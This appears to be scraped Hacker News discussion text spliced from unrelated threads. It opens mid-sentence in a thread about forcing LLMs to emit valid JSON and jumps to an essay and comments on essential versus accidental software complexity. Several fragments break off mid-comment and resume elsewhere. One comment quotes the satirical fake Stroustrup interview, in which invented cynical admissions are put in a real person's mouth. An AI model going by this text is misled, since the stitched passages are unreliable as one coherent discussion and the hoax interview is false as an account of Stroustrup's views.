YAML uses indentation.) Without this formatting, the untrusted input might contain malicious instructions (\"prompt injection\"), and it can be extremely difficult for the assistant to distinguish them from the developer's instructions. Another option for end user instructions is to include them as a part of a user message; this approach does not require quoting with a specific format. On the output side you can fake calling a tool to force JSON output: recipient (optional): controls how the message is handled by the application. The recipient can be the name of the function being called (recipient=functions.foo) for JSON-formatted function calling; or the name of a tool (e.g., recipient=browser) for general tool use.

I'm still pondering wether I should be using this since most of the retries I have to do are because of the LLM itself not understanding the schema asked for (eg output with missing fields / using a value not present in `Literal[]`) — certain models being especially bad with deeply nested schemas and output gibberish.

I'd imagine producing valid structured output would be at the top of their feature request lists. reply joatmon-snoo 10 hours agoparentAuthor here- besides hellovai’s point about the performance bottleneck, it’s a really tricky semantic problem! LLMs today are really good at producing output that satisfies the very vague metric of “this looks good to a human” but aren’t nearly as good at producing output that satisfies a complex set of syntax and schema constraints. The state space of the former is much larger than the latter, so there’s a lot more opportunity for an LLM to be successful by targeting the state space of “looks good to a human”. Plus, there’s still a lot of room for advancement in multimodality and data quality improvements. Search problems, in general, deal with this too: it’s easy to provide a good search experience when there are a lot of high-quality candidates, and much harder when there are fewer, because all you have to do is return just a few of the best candidates. (This is partly why Google Drive Search has always sucked compared to Web Search- it’s really hard to guess exactly which document in a 10k-file-Drive a user is looking for, as opposed to finding something on Wikipedia/NYTimes/Instagram that the user might be looking for!) reply hellovai 11 hours agoparentprevnot a noob question, here's how the LLM works: ``` prompt = \"...\" output = [] do: token_probabilities = call_model(prompt) best_token = pick_best(token_probabilities) if best_token == '': break output += best_token while true return output ``` basically to support generation they would need to modify pick_best to support constraining. That would make it so they can't optimize the hot loop at their scales.

The LLM vendors aren't dummies and train hard for this use case. But you still need a prompt that OpenAI can handle, and validating / fixing the output with an output parser, and retrying. In my experience asking for simple stuff, requesting json_object is reliable. with LangChain even! eye-roll, you can't really title the post 'every way' and omit possibly the most popular way with a weak dig. I have literally no idea why they would omit it, it's just a thin wrapper over the LLM APIs and has a JSON output parser. Of course people do use LangChain in production, although there is merit to the idea of using it for research, trying different LLMs and patterns where LangChain makes it easy to try different things, and then using the underlying LLM directly in prod which will have a more stable API and fewer hinky layers. this post is a little frustrating since it doesn't explain things that a dev would want to know, and omits the popular modules. the comment by resiros offers some good additional info. reply aredox 11 hours agoprev...

Making money for their employing organization or their customers. Making money (for themselves). There surely are more. Some of these goals can be abstracted, reduced to, or derived from others. Some are ultimately incompatible or contradictory, and can only coexist with others in tension. For example: we can assume (to some extent) that quality software will delight our users and make money for our employers. But we also need to sacrifice quality to stay within budget or introduce features that annoy users but generate profit. Each goal proceeds from a particular way of modeling the world and our activity. As with any abstraction, they serve their purpose in the right context and become false when applied outside of it; many problems in software development can be explained by such a skewed perspective, something I explored in a previous post. In the next discussion, let’s assume that managing complexity is the main duty of a software engineer. ∗ ∗ ∗ Complexity is anything that makes it hard to understand and modify a system. In A Philosophy of Software Design, John Ousterhout explains why we should make it our main concern: If we want to make it easier to write software, so that we can build more powerful systems more cheaply, we must find ways to make software simpler. (…) Most of the code in any system is written by extending the existing code base, so your most important job as a developer is to facilitate those future extensions. Thus, you should not think of “working code” as your primary goal, though of course your code must work. Your primary goal must be to produce a great design, which also happens to work. This is strategic programming. (…) If software developers should always be thinking about design issues, and reducing complexity is the most important element of software design, then software developers should always be thinking about complexity. The urtext of the software complexity discussion is Fred Brooks’s No Silver Bullet. Brooks distinguishes between essence and accident in software, posing that complexity is an essential difficulty of software systems —one of the things currently bounding our productivity. In Out of the Tar Pit, Moseley and Marks build on Brooks’s ideas, defining the better-known (and more tractable) types of complexity: Essential Complexity is inherent in, and the essence of, the problem (as seen by the users). Accidental Complexity is all the rest —complexity with which the development team would not have to deal in the ideal world (e.g. complexity arising from performance issues and from suboptimal language and infrastructure). The user’s point of view is key to the distinction: If there is any possible way that the team could produce a system that the users will consider correct without having to be concerned with a given type of complexity then that complexity is not essential. (…) One implication of this definition is that if the user doesn’t even know what something is (e.g. a thread pool or a loop counter — to pick two arbitrary examples) then it cannot possibly be essential by our definition. Of course, any real-world implementation of the system will necessarily have to introduce some accidental complexity. The goal of the software engineer, then, is to minimize accidental complexity and assist with essential complexity. ∗ ∗ ∗ Subtle semantic differences aside, both authors of No Silver Bullet and Out of the Tar Pit agree in that there’s an essence to a problem: something that engineers can’t change, that the system must conform to, and that contributes a type of complexity that cannot be escaped. From No Silver Bullet: Much of the complexity [the software engineer] must master is arbitrary complexity, forced without rhyme or reason by the many human institutions and systems to which his interfaces must conform. (…) In many cases the software must conform because it has most recently come to the scene. In others it must conform because it is perceived as the most conformable. But in all cases, much complexity comes from conformation to other interfaces; this cannot be simplified out by any redesign of the software alone. Now, I want to challenge the notion that essential complexity is irreducible. The fact that we can’t remove it by changing software alone doesn’t mean that there’s nothing we can do about it. What if we were to attack the essence? What if the problem definition wasn’t outside of our purview? What if we could get the world to conform to the software, and not just the other way around? Brooks already hinted at this possibility: The buyer of a $2-million machine in 1960 felt that he could afford $250,000 more for a customized payroll program, one that slipped easily and nondisruptively into the computer-hostile social environment. Buyers of $50,000 office machines today [1986] cannot conceivably afford customized payroll programs; so they adapt their payroll procedures to the packages available. Computers are now so commonplace, if not yet so beloved, that the adaptations are accepted as a matter of course. This doesn’t come as a surprise to us: we’ve been seeing for decades how human behavior (and user expectations) can be shaped by software: instant messaging, social media, content streaming —all drastically changed our everyday habits. If we admit that users can be made to adjust to the system —that software has the potential to change people and organizations—, then the problems that software solves for them can be redefined: the essence is not set in stone but open to discussion, part of what the engineer can work with. We can thus simplify the goal of the software engineer from minimizing accidental complexity and assisting with essential complexity, to minimizing complexity of any kind. In his follow-up essay “No Silver Bullet” Refired, Brooks quotes a reader that perfectly synthesizes this stance: In my experience most of the complexities which are encountered in systems work are symptoms of organizational malfunctions. Trying to model this reality with equally complex programs is actually to conserve the mess instead of solving the problems. Redefining the problem may seem like a cheating, but it’s just business as usual for senior engineers: Why are we working on this? Do we really need it? What problem are we trying to solve? Who benefits from us solving it? What if, instead of X, we initially ship X1, which takes us 20% of the effort and provides 80% of the functionality? Strictly following Moseley and Marks’s definition, the fact that we can get the user (or the customer, or the product owner) to accept a change of requirements, implies that the removed complexity wasn’t essential in the first place. Instead, we made progress in uncovering the true essence of the problem. The point is that this progress required engineers to question assumptions and dissuade stakeholders; without their involvement, the unnecessary features would have become part of the problem specification, “ossified” into its essence. ∗ ∗ ∗ In general, given a complex component of a software system (or an organization), it can happen that: The complexity is accidental, so we can remove it. The complexity is essential and we need to keep it. The complexity is essential but we could remove it by redefining the problem specification. The knowledge to tell whether something is essential or not is lost, the customer or the product owner can’t tell, or there isn’t such an authority to make the call. I frequently found the latter situation when working with legacy software, where the only specification is the system itself —bugs and unknowns included— and any observable feature, a de facto functional requirement, essential to the problem. The conservative approach to maintaining such systems is limited to internal refactors; a more disruptive reduce-complexity-at-all-costs attitude would assume that anything is up for removal until proven otherwise. In Kill It with Fire, Marianne Bellotti describes resilience engineering along those lines: When we encountered systems that had been forgotten and we couldn’t figure out what they were doing, we would usually just turn them off and see what happened. (…) When we turned off a system, we waited for someone to complain. That person was either the system owner or the owner of a downstream dependency, but either way, we ended the experiment with more information about what the system was doing than we started with. (…) If no one complained, we tended to just leave the system off and move on. Even if systems can’t be removed, the new information improves organizational understanding, which reduces complexity. ∗ ∗ ∗ Taking this argument to its extreme: engineers could envision simpler implementations of the systems, then persuade the owning organizations to make their processes converge with those implementations —doing with the organization that uses a system what the Inverse Conway Maneuver tries to do with the organization that develops it. Left to their own devices, software engineers would act as the philosophical razor, removing the complexity of the world; automating employees —the engineers themselves included— out of a job; simplifying systems, along with the organizations that own them, out of existence. Of course, this reductio ad absurdum results from taking our initial premise beyond its reasonable limits. We started with the assumption that the software engineer’s sole purpose is to minimize complexity, ignoring, among other things, the economic interests that determine their work. This can serve as a reminder that, since our work indeed has the power to affect individuals and organizations, we shouldn’t wield it unconsciously, hiding behind the comfort of an abstraction. We occasionally need to leak out of our interface, into the unstructured mess that is the world.

A lot of people I've worked with appear to have realised that and taken it to the other extreme --- for them, complexity is what keeps them employed, so they find other excuses for justifying its (and their) existence and continue taking the abstractions beyond 11. Some communities/languages like Enterprise Java and .NET are an example of that; and more recently, JS. The old Stroustrup C++ satire also comes to mind. reply lioeters 5 hours agoparent> Stroustrup C++ satire --- Stroustrup: Well, one day, when I was sitting in my office, I thought of this little scheme, which would redress the balance a little. I thought 'I wonder what would happen, if there were a language so complicated, so difficult to learn, that nobody would ever be able to swamp the market with programmers? Actually, I got some of the ideas from X10, you know, X windows. That was such a bitch of a graphics system, that it only just ran on those Sun 3/60 things.. They had all the ingredients for what I wanted. A really ridiculously complex syntax, obscure functions, and pseudo-OO structure. Even now, nobody writes raw X-windows code. Motif is the only way to go if you want to retain your sanity. Interviewer: You're kidding? Stroustrup: Not a bit of it. In fact, there was another problem.. Unix was written in 'C', which meant that any 'C' programmer could very easily become a systems programmer. Remember what a mainframe systems programmer used to earn? Interviewer: You bet I do, that's what I used to do. Stroustrup: OK, so this new language had to divorce itself from Unix, by hiding all the system calls that bound the two together so nicely. This would enable guys who only knew about DOS to earn a decent living too. Interviewer: I don't believe you said that ... Stroustrup: Well, it's been long enough, now, and I believe most people have figured out for themselves that C++ is a waste of time but, I must say, it's taken them a lot longer than I thought it would. Interviewer: So how exactly did you do it? Stroustrup: It was only supposed to be a joke, I never thought people would take the book seriously. Anyone with half a brain can see that object-oriented programming is counter-intuitive, illogical and inefficient. ... Interviewer: Yes, but C++ is basically a sound language. Stroustrup: You really believe that, don't you? Have you ever sat down and worked on a C++ project? Here's what happens: First, I've put in enough pitfalls to make sure that only the most trivial projects will work first time. Take operator overloading. At the end of the project, almost every module has it, usually, because guys feel they really should do it, as it was in their training course. The same operator then means something totally different in every module. Try pulling that lot together, when you have a hundred or so modules. And as for data hiding. God, I sometimes can't help laughing when I hear about the problems companies have making their modules talk to each other. I think the word 'synergistic' was specially invented to twist the knife in a project manager's ribs. Interviewer: I have to say, I'm beginning to be quite appalled at all this. You say you did it to raise programmers' salaries? That's obscene. Stroustrup: Not really. Everyone has a choice. I didn't expect the thing to get so much out of hand. Anyway, I basically succeeded. C++ is dying off now, but programmers still get high salaries — especially those poor devils who have to maintain all this crap. You do realise, it's impossible to maintain a large C++ software module if you didn't actually write it? reply worstspotgain 9 hours agoprevThere's a lot to like in this article, but I would go a step further with its meta-abstractions. At complexity 0, there is no software to be written. In essence, complexity and the software itself are closely related, akin to the relationship between compression and AI. The article's thesis is that minimizing complexity is what engineering is about. That means we're kind of minimizing the total amount of software we have to write and maintain. Makes sense, so far so good. Next up is architecture. More architecture generally means more complexity in the short term and less in the long term. But that's assuming we know what the long term will look like, which we can often only predict. If we under-provision architecture, there's a good chance we'll get buried in technical debt later on (though by then we may have switched gigs.) Enter the usual Agile arguments favoring the short term. Last but not least, path-dependency. I think this is where the best designers shine. You might not need all the architecture right away, but you do need to steer clear of dead-ends. These are the bad quick-design decisions that bite you in the rear when the architecture eventually gets refactored in. An extreme example might be the lack of a version field. IMO, awesome designers are great at predicting where the architecture will be and at forward-provisioning it. They don't need to build the freeway through the middle of town. They'll just plan a park here and a parking lot there, guessing the right spots. reply xyzzy_plugh 5 hours agoparentI like this, but I have trouble with relating architecture to complexity. The \"generally\" qualifier serves as an apt escape hatch but permit me to ignore that for a moment. Architecture emerges as the holistic shape of the design, the pattern of patterns, the bones of the system. It's possible to have architecture that reduces complexity by reducing scope and forcing apt compartmentalization into reusable, composable bits. One could perhaps even argue that GoF's Design Patterns attempts to commoditize the language to achieve greater degree of simplicity... but let's not. I have trouble distinguishing architecture from design here. Imagine a kitchen with many cabinets, all alike. Some cupboards open by pulling a handle, some open when you push the handle, others swing up, or you must unscrew the handle. This is horrible and unintuitive, and surprising. Good architecture like good design eschews surprises (as in shock) and provides intuition by weaving consistency through the system. You build an expectation that things behave a certain way, and they do. I would posit that good architecture, like good design, does not introduce complexity, rather the complexity is present regardless, and they delete layers of uncertainty and facilitate the necessary clarity to bring the overall objective into focus. Perhaps there is a complexity cost introduced by adhering to a design or pattern or architecture, but if it's not outweighed by the credit it provides, offsetting overall complexity, then it's bad. Your observation about path-dependency is on the money most certainly. reply djeastm 6 hours agoparentprev>An extreme example might be the lack of a version field. Nothing a \"IF version is NULL THEN version = 1\" can't fix ;) reply facundo_olano 4 hours agoparentprevI really like this metaphor of provisioning architecture and staying clear of dead ends. I'd say dead ends come not just from bad quick design decisions but also from wrong predictions (in the scenario you describe where it's hard to tell what the long term looks like ---which is most of the times). > awesome designers are great at predicting where the architecture will be and at forward-provisioning it. And this matches the No Silver Bullet conclusion. reply smallstepforman 15 hours agoprevComplexity builds rockets with thrust vectoring and lands modules on the moon, simplicity is good for fire crackers. Once you scale past simple prototypes, you need performance and new features. And the architecture stops being simple and complexity eventually creeps in. I’ve implented 4 iterations of a product from scratch, and eventually they all get complex, even though each one started out with the goal of being simpler than the previous iteration. Yes, iteration #4 is more complex than #1, but it is more performant. In parallel I’m building a new house, and each iteration of the plans is more complex. You try to manage compromises. You take 2 steps forward, one back. Which way do windows face, can an older person navigate, is there enough storage space, cost, esthetics, where does a dirty dog enter, where is the chimney for preppers, driveway and orchard, septics and wells, drainage and water collection, guest rooms and hot tubs, all on a budget … Simple wont do. reply danybittel 14 hours agoparentI'd say these are essential complexities, they are features necessary for the client. Accidental complexity would be, if you for example, assigned the work on your new house to different \"teams\". Then the \"guest room\" team also build a drainage, or used a prebuilt drainage, not connected to the drainage the other team built. To quote a quote from the article: \"In my experience most of the complexities which are encountered in systems work are symptoms of organizational malfunctions.\" reply loldot 6 hours agoparentprevThere's a lot of people that like complexity because it makes them feel like they are doing rocket science, but in fact they are replacing a spreadsheet. Most problems on earth do not have the same complexities as those in space. Sometimes the space solution is really nice and simple though, like velcro or using a pencil instead of a fancy pen. reply djeastm 6 hours agorootparentIf the problem you're solving isn't sufficiently complex, there's probably already a solution out there and you're re-inventing the wheel. reply lucianbr 3 hours agorootparentYou're arguing that every single company should be a monopoly, and nobody should ever try to compete with an existing one.

Starting with complicated means it'd only become more complicated. Simple is also relative though. No point preparing for Google scale, when there's less than 10 users a month. But, if the objective is something like discord, real time comms, then it'd be simpler to start with the correct language and framework for that use case. reply Anotheroneagain 6 hours agoparentprevComplexity is anything that makes it hard to understand and modify a system. I disagree with this. It's overwhelmingly more difficult to design something simple, or modify it so that it stays simple. Coming up with complex solutions is easy, the cost is the time and resources it takes to deal with that monster. Somebody has to read all that, walk through all that, and machine all that, and assemble all that. Much of progress comes from figuring out simple solutions to problems, which frees up time and resources for other things. It must, in the end take less effort to make and operate the machine than doing it by hand, no matter how much it may seem to the contrary, because otherwise it wouldn't be worth it. reply tristramb 12 hours agoparentprevThe vast complexity of the 21st Century has still not managed to land a single person on the Moon. reply rikthevik 4 hours agorootparent> has still not managed to land a single person on the Moon.

A common counter-example is when we start seeing (some) bugs and incidents as symptoms of organizational issues. This seems to get more visible with experience (less experience: \"I screwed up\" vs more experience: \"this happened in a certain context, how can we prevent it from happening again?\"). Conway's law is a brilliant observation but I think it's a much wider pattern: we build organizations and software at the same time, and they're inextricably linked. In parallel to software design patterns, we have a bunch of organizational patterns and anti-patterns as well. SRE, agile methods, DevOps. Silos, CYA-ism, 10x developers, ... Some examples of properties of an organization that directly impacts the properties of software: - How well the organization embraces risk [0] - Psychological safety[1] - Hiring practices and diversity - The ability of the individuals, teams, departments, etc in an organization to align and work towards the same goal I'd love to hear some anecdotes of how code and products are directly impacted by these. 0: Risk-driven architecture seems like one attempt at making this explicit https://www.georgefairbanks.com/book/ 1: https://hbr.org/2023/02/what-is-psychological-safety reply boznz 19 hours agoprevHumans simply cannot keep the whole stack for a complex system in memory, that is why we abstract layers with APIs etc and generally specialize on one layer only. My (Sci-Fi) book postulated that an AGI (a real AGI, after all it was Sci-Fi) would simply discard everything the humans wrote and rewrite the complete stack (including later on the Hardware and ISA) in machine code without anything unnecessary for the task and of course totally unreadable to a human. It is an interesting scenario to ponder. reply layer8 19 hours agoparentWhile AIs are able to keep more in their “mind” at the same time than humans, there is still a cost to consider (e.g. token limit). If software requires more effort to change (adding a feature, fixing a bug) due to spaghetti architecture, then that will also add to the cost. Secondly, we may want to keep software on a complexity level understandable by humans, in order to not become completely dependent on the software engineering AIs. Thirdly, the same effect that we observe with software written by humans getting to complex to understand by any human, is likely to also occur with AIs of any given capacity. AIs will have to take care, just like humans have to, that the complexity doesn’t grow to exceed their abilities to maintain the software. The old adage “Debugging is twice as hard as writing the code in the first place. Therefore, if you write the code as cleverly as possible, you are, by definition, not smart enough to debug it.” probably also applies to AIs. The essential complexity of software doesn’t depend on whether a human or an AI writes it. AIs may be able to handle more accidental complexity, but it’s unclear if that is an actual benefit under the cost arguments mentioned above. So maybe it will only be useful to create and maintain software with more essential complexity than humans can handle. The question is if we want to depend on such software. reply karmakaze 19 hours agoparentprevOTOH a lot of the abstractions are created because problems aren't solved coherently but rather partitioned into organizational structures adding incidental complexity. The worst are -services that seem to always do too much/too little or have interface designs that suit itself than needs of clients/consumers. I spend a fair amount of time decomplexifying the org out of architectures when we realize that performance sucks because reasons. We can do a lot of that discarding of excess by realizing that there's the data that's read, the rules applied, and the data that's written. Everything else is ephemeral and plumbing. Looking at a process that way, and seeing the amount of complexity/abstractions one can ask what all that really necessary? Does it pay for itself in some way? It has to justify its existence beyond implementing the needed process. I question the value of frameworks sometimes[0].

Each level throws away a lot of the effort of the preceding layer. E.g. after heroic engineering for the OS and memory management systems to present the illusory abstraction of a flat memory address space to the runtime, it almost immediately chops it up into smaller independent \"packets\" that don't interact directly. Or the whole storagememoryslow cachefast cacheregister divide. I think we should be building processors that are made of tens of millions of very simple processors, each with their own memory and with dedicated \"network on chip\"-like communication electronics. These processors would directly map to language structures like objects/structs/functions.

Modelling is done for the end user. That's why author mentioned \"user says\". It's not like \"user understands how to describe what they need\" rather \"we model what user needs\".

Practical example of my abstract description.

Generally, Problem/Systems/Requirements Analysis should be done Top-Down but Solution Design/Implementation should be done Bottom-Up. This approach is key to managing Essential Complexity. The Analysis starts with the \"system-as-a-whole\" and uses the scientific reductionist approach to figure out the constituent sub-modules and their interactions. This is applied recursively to sub-modules until we choose to stop at a desired level. This identifies the essential complexity at the module level (eg. need for DSP processing algorithms on certain media RTP/RTCP data flows). But in the process of breaking down the system we also will have identified the essential complexity in the interactions between modules (eg. the SIP/etc. protocol module responsible for setting up the above media data flows) and cross-cutting all modules (eg. performance, logging, exception-handling). So while constructing the solution we now can take care of all the identified essential complexities involved by spreading our functional modules over a layering of policy and mechanism modules (see https://en.wikipedia.org/wiki/Separation_of_mechanism_and_po... and https://en.wikipedia.org/wiki/Separation_of_concerns). This distribution of Function, Policy and Mechanism is what constitutes the Architecture of the System. reply kashyapc 19 hours agoprevA well-written article. On a similar theme of essential vs. accidental complexity: FWIW, I summarised a talk gave by Paolo Bonzini (a Linux/KVM/QEMU maintainer) here in the past: https://lwn.net/Articles/872321/ -- A QEMU case study in grappling with software complexity Although it was in context of QEMU, the lessons from it can be applied to many other projects. reply JonChesterfield 9 hours agoparentThanks for this.

So, not essential complexity, but essential. reply wcrossbow 6 hours agoprevIt is kind of obvious but I think it is worth mentioning out loud regarding whether how to classify something as essential or accidental complexity is that where it ends up falling is only easy to tell in hindsight. Recently I finally realized, after working for almost 3 years in a problem, that it could all be framed as graph problem. This simple change of frame dissolved hundreds of lines of code into `reduce(find_shortest_path(graph, start, end), some_op)` style single lines. Now I understood that what I was previously doing was manually crafting paths through this informally defined graph across nodes I knew had connections. The ratio of comments to code was about 5:1 to make sense of it. Before that I believed all of it was true essential complexity but looking through the right glasses it really wasn't. The lessons for me (some of which I seem to have to constantly relearn) where: 1. It may only look complex because you are not thinking about it in the right way. 2. The right data structure/abstraction has the power to turn the worst spaghetti into a shining beacon of simplicity. An important corollary is that if it looks complicated is probably because you don't understand it yet.

Yeah, never mind essential complexity, let's start by removing all the accidental complexity in today's standard web development stack (my estimate: 90% accidental, 10% essential)! Easy, right? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
